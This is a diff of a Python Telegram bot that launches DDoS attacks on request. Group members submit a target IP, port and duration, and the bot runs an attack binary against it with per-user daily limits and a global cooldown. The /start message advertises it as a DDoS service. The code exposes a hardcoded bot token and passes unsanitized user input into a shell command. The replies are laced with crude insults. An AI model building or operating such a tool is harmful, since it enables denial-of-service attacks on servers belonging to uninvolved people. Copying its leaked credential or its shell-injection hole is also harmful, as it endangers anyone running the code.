@@ -5,6 +5,8 @@ import time
 import subprocess
 import threading
 
+from keep_alive import keep_alive
+keep_alive()
 # Insert your Telegram bot token here
 bot = telebot.TeleBot('7630314402:AAE37dJ9bTZsk7KO2SwPjGWCBp1CyGU2UJc')
 
@@ -12,19 +14,19 @@ bot = telebot.TeleBot('7630314402:AAE37dJ9bTZsk7KO2SwPjGWCBp1CyGU2UJc')
 admin_id = ["7855020275"]
 
 # Group and channel details
-GROUP_ID = "-1002374071862"  # The ID of the group where the bot operates
+GROUP_ID = "-1002374071862"
 CHANNEL_USERNAME = "@RRAJARAJ_04"
 
 # Default cooldown and attack limits
 COOLDOWN_TIME = 280  # Cooldown in seconds
-ATTACK_LIMIT = 15  # Max attacks per day
+ATTACK_LIMIT = 10  # Max attacks per day
 
 # Files to store user data
 USER_FILE = "users.txt"
 
 # Dictionary to store user states
 user_data = {}
-bgmi_cooldown = {}  # Cooldown tracker for each user
+global_last_attack_time = None  # Global cooldown tracker
 
 # Function to load user data from the file
 def load_users():
@@ -54,37 +56,43 @@ def is_user_in_channel(user_id):
     except:
         return False
 
-# Function to log commands
-def log_command(user_id, target, port, time):
-    with open("command_logs.txt", "a") as log_file:
-        log_file.write(f"{datetime.datetime.now()} - User: {user_id}, Target: {target}, Port: {port}, Time: {time}\n")
-
 # Command to handle attacks
-@bot.message_handler(commands=['attack'])
+@bot.message_handler(commands=['attack1'])
 def handle_attack(message):
+    global global_last_attack_time
     user_id = str(message.from_user.id)
-    
+
     # Ensure user is in the group
     if message.chat.id != int(GROUP_ID):
-        bot.reply_to(message, "This bot can only be used in the specified group. Join @RRAJARAJ_04")
+        bot.reply_to(message, "ye bot sirf group pr chalega chanal join kro access milega Join - https://t.me/RRAJARAJ_04")
         return
 
     # Ensure user is a member of the channel
     if not is_user_in_channel(user_id):
-        bot.reply_to(message, f"You must join {CHANNEL_USERNAME} to use this bot.")
+        bot.reply_to(message, f"pahle join krle lode{CHANNEL_USERNAME} to use this bot.")
         return
 
-    # Check cooldown for regular users
-    if user_id not in admin_id and user_id in bgmi_cooldown:
-        cooldown_remaining = (datetime.datetime.now() - bgmi_cooldown[user_id]).seconds
-        if cooldown_remaining < COOLDOWN_TIME:
-            bot.reply_to(message, f"ARAAM KR LODE THODI DER {COOLDOWN_TIME - cooldown_remaining} seconds.")
-            return
+    # Check global cooldown
+    if global_last_attack_time and (datetime.datetime.now() - global_last_attack_time).seconds < COOLDOWN_TIME:
+        remaining_time = COOLDOWN_TIME - (datetime.datetime.now() - global_last_attack_time).seconds
+        bot.reply_to(message, f"🤣 PAHLE SE ATTACK LGA H LODE WAIT KR {remaining_time} seconds.")
+        return
+
+    # Initialize user data if not present
+    if user_id not in user_data:
+        user_data[user_id] = {'attacks': 0, 'last_reset': datetime.datetime.now(), 'last_attack': None}
+
+    user = user_data[user_id]
+
+    # Check user's daily attack limit
+    if user['attacks'] >= ATTACK_LIMIT:
+        bot.reply_to(message, f"aaj ka limit khatam lode {ATTACK_LIMIT}. kal fir lgana😃.")
+        return
 
     # Parse command arguments
     command = message.text.split()
     if len(command) != 4:
-        bot.reply_to(message, "Usage: /attack <IP> <PORT> <TIME>")
+        bot.reply_to(message, "Usage: /attack1 <IP> <PORT> <TIME>")
         return
 
     target, port, time_duration = command[1], command[2], command[3]
@@ -97,28 +105,50 @@ def handle_attack(message):
         return
 
     if time_duration > 180:
-        bot.reply_to(message, "Error: Attack duration cannot exceed 180 seconds.")
+        bot.reply_to(message, "ABE LODE FREE KA H TO 180 SE JADA MAREGA KYA.")
         return
 
     # Execute the attack via the binary
     full_command = f"./raja {target} {port} {time_duration} 800"
     try:
-        bot.reply_to(message, f"PAPA IS BACK CHUDAI CHALU: {target}, Port: {port}, Time: {time_duration} seconds.")
+        bot.reply_to(message, f"😭SEVER CHUD GYA😡: {target}, Port: {port}, Time: {time_duration} seconds.\n"
+                              f"teri baki attack limit : {ATTACK_LIMIT - user['attacks'] - 1}")
         subprocess.run(full_command, shell=True)
-        bot.reply_to(message, f"ATTACK KHATAM LODE: {target}, Port: {port}, Time: {time_duration} seconds.")
+        bot.reply_to(message, f"attack khatam land: {target}, Port: {port}, Time: {time_duration} seconds.")
     except Exception as e:
         bot.reply_to(message, f"An error occurred while executing the attack: {str(e)}")
         return
 
-    # Log command and update cooldown
-    log_command(user_id, target, port, time_duration)
-    bgmi_cooldown[user_id] = datetime.datetime.now()
+    # Update user data and global cooldown
+    user['attacks'] += 1
+    user['last_attack'] = datetime.datetime.now()
+    global_last_attack_time = datetime.datetime.now()
+    save_users()
 
-# Admin command to reset a user's attack limit
+# Command to check global cooldown
+@bot.message_handler(commands=['check_cooldown'])
+def check_cooldown(message):
+    if global_last_attack_time and (datetime.datetime.now() - global_last_attack_time).seconds < COOLDOWN_TIME:
+        remaining_time = COOLDOWN_TIME - (datetime.datetime.now() - global_last_attack_time).seconds
+        bot.reply_to(message, f"Global cooldown: {remaining_time} seconds remaining.")
+    else:
+        bot.reply_to(message, "cooldown lga h.")
+
+# Command to check remaining attacks for a user
+@bot.message_handler(commands=['check_remaining_attack'])
+def check_remaining_attack(message):
+    user_id = str(message.from_user.id)
+    if user_id not in user_data:
+        bot.reply_to(message, f"teri baki attack {ATTACK_LIMIT}  aaj ki.")
+    else:
+        remaining_attacks = ATTACK_LIMIT - user_data[user_id]['attacks']
+        bot.reply_to(message, f"You have {remaining_attacks} attacks remaining for today.")
+
+# Admin commands
 @bot.message_handler(commands=['reset'])
 def reset_user(message):
     if str(message.from_user.id) not in admin_id:
-        bot.reply_to(message, "BAAP SIRF CHALEGE YE COMMAND .")
+        bot.reply_to(message, "Only admins can use this command.")
         return
 
     command = message.text.split()
@@ -130,15 +160,14 @@ def reset_user(message):
     if user_id in user_data:
         user_data[user_id]['attacks'] = 0
         save_users()
-        bot.reply_to(message, f"teko etna hi limit h {user_id} has been reset.")
+        bot.reply_to(message, f"Attack limit for user {user_id} has been reset.")
     else:
         bot.reply_to(message, f"No data found for user {user_id}.")
 
-# Admin command to adjust cooldown time
 @bot.message_handler(commands=['setcooldown'])
 def set_cooldown(message):
     if str(message.from_user.id) not in admin_id:
-        bot.reply_to(message, "PAPA HI CHALEGA BA @RAJARAJ_04.")
+        bot.reply_to(message, "Only admins can use this command.")
         return
 
     command = message.text.split()
@@ -153,45 +182,32 @@ def set_cooldown(message):
     except ValueError:
         bot.reply_to(message, "Please provide a valid number of seconds.")
 
-# Admin command to remove user data
-@bot.message_handler(commands=['remove'])
-def remove_user(message):
-    if str(message.from_user.id) not in admin_id:
-        bot.reply_to(message, "PAPA HI CHALEGA BA @RAJARAJ_04.")
-        return
-
-    command = message.text.split()
-    if len(command) != 2:
-        bot.reply_to(message, "Usage: /remove <user_id>")
-        return
-
-    user_id = command[1]
-    if user_id in user_data:
-        del user_data[user_id]
-        save_users()
-        bot.reply_to(message, f"User data for {user_id} has been removed.")
-    else:
-        bot.reply_to(message, f"No data found for user {user_id}.")
-
-# Admin command to view total and all users
 @bot.message_handler(commands=['viewusers'])
 def view_users(message):
     if str(message.from_user.id) not in admin_id:
-        bot.reply_to(message, "PAPA HI CHALEGA BA @RAJARAJ_04.")
+        bot.reply_to(message, "Only admins can use this command.")
         return
 
-    total_users = len(user_data)
-    users_list = "\n".join([f"{user_id}: {data['attacks']} attacks" for user_id, data in user_data.items()])
-    bot.reply_to(message, f"Total users: {total_users}\n\n{users_list}")
+    user_list = "\n".join([f"User ID: {user_id}, Attacks Used: {data['attacks']}, Remaining: {ATTACK_LIMIT - data['attacks']}" 
+                           for user_id, data in user_data.items()])
+    bot.reply_to(message, f"User Summary:\n\n{user_list}")
 
-# Function to reset all daily limits automatically at midnight
+
+@bot.message_handler(commands=['start'])
+def welcome_start(message):
+    user_name = message.from_user.first_name
+    response = f"Welcome to Your Home, Feel Free to Explore.\nThe World's Best Ddos Bot\nTo Use This Bot Join https://t.me/c/2374071862/5095 "
+    bot.reply_to(message, response)
+
+# Function to reset daily limits automatically
 def auto_reset():
     while True:
         now = datetime.datetime.now()
         seconds_until_midnight = ((24 - now.hour - 1) * 3600) + ((60 - now.minute - 1) * 60) + (60 - now.second)
         time.sleep(seconds_until_midnight)
-        for user in user_data.values():
-            user['attacks'] = 0
+        for user_id in user_data:
+            user_data[user_id]['attacks'] = 0
+            user_data[user_id]['last_reset'] = datetime.datetime.now()
         save_users()
 
 # Start auto-reset in a separate thread
@@ -201,5 +217,12 @@ reset_thread.start()
 # Load user data on startup
 load_users()
 
-# Start polling
-bot.polling()
+
+#bot.polling()
+while True:
+    try:
+        bot.polling(none_stop=True)
+    except Exception as e:
+        print(e)
+        # Add a small delay to avoid rapid looping in case of persistent errors
+        time.sleep(15)
